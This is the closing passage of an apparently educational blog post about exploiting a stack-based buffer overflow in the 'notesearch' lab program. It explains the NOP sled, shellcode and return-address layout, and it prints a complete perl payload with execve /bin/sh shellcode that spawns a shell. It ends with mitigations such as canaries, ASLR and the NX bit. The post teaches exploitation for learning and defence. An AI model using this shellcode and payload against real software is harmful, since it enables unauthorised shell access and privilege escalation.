<p>First, we have the “NOP sled”. A NOP is a no-operation instruction that
CPUs include for timing purposes, among other things. In our case, we
use them to force the computer to slide into the shellcode we introduced
in the stack. Theoretically, you could do it without the aid of a “NOP
sled”, but it becomes much harder. You will have problems with memory
alignment and other low-level stuff that I lack knowledge of. Moreover,
the compiler is picky and won’t allow you to execute the shellcode from
whatever memory address you want.</p>
<p>Then, we have the shellcode. A small piece of code built in assembler to
execute some code. In that example, to give us access to a shell.</p>
<p>Following the shellcode, we find some more NOP operations. Sometimes,
shellcodes need to write some bytes after themselves. The compiler can
complain about that. These NOP operations will help us.</p>
<p>The last part is the return address. We will overwrite it with a memory
address where the NOP sled is located.</p>
<p>That’s it for the structure. Coming back to the exploit, on my first try
I used a “NOP sled, shellcode, NOP sled address” structure. It didn’t
work for multiple reasons. NX bit wasn’t disabled and ASLR wasn’t
disabled.</p>
<p><img  src="/_astro/notesearch-stack.CuTXw4O9_1HW1IE.webp" alt="" width="1026" height="554" loading="lazy" decoding="async"></p>
<p>After disabling them, the issue was creating the correct payload.
Sometimes, the execution failed with a SEGFAULT and sometimes with a
SIGILL. Trying a myriad of different payload structures and lengths for
the NOP operations, I finally crafted a payload that worked using gdb.</p>
<p><img  src="/_astro/notesearch-gdb-exploit.B2R-iprd_Z29ouFF.webp" alt="" width="828" height="368" loading="lazy" decoding="async"></p>
<p>This payload doesn’t work outside gdb. The environment in which we
execute the exploit can modify the position of the variables in the
stack. For example, the environment variables used on gdb differ from
the ones on the shell. To circumvent that issue, we can pass the
environment variables to gdb.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">env</span><span style="color:#F1FA8C"> gdb</span><span style="color:#F1FA8C"> notesearch</span></span>
<span class="line"></span></code></pre>
<p>The path from where you execute the exploit is also relevant.
<code>./notesearch $(perl -e 'print "\x90" x 57, "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05", "\x90" x 40, "\x90\xe3\xff\xff\xff\x7f\x00\x00"')</code>
didn’t work for me, while
<code>~/Desktop/overflow/notesearch $(perl -e 'print "\x90" x 57, "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05", "\x90" x 40, "\x90\xe3\xff\xff\xff\x7f\x00\x00"')</code>
worked.</p>
<p><img  src="/_astro/notesearch-final-exploit.BdbsqXtn_VFSON.webp" alt="" width="968" height="137" loading="lazy" decoding="async"></p>
<p>That’s it!!! We got our shell. In theory, we should get root access due
to the SUID permissions. However, some shells now throw SUID permissions
when spawning new shells from a process with SUID to avoid this kind of
attacks. More stuff to learn in the future!</p>
<h1 id="how-can-we-prevent-buffer-overflows">How can we prevent buffer overflows?</h1>
<p>DON’T COPY DATA WITHOUT CHECKING THE LENGTH!</p>
<p>Most people forget to do that, so luckily, there are some security
features that mitigate the attack. We have seen a some of them during
the exercise: canaries, PIE, ASLR or NX bit.</p>
<h1 id="conclusion">Conclusion</h1>
<p>Now we know what a stack based buffer overflow is, why it works, how to
exploit it and some protections mechanisms. We don’t have an execuse to
avoid them.</p>  </div> </article> <footer></footer> </body></html>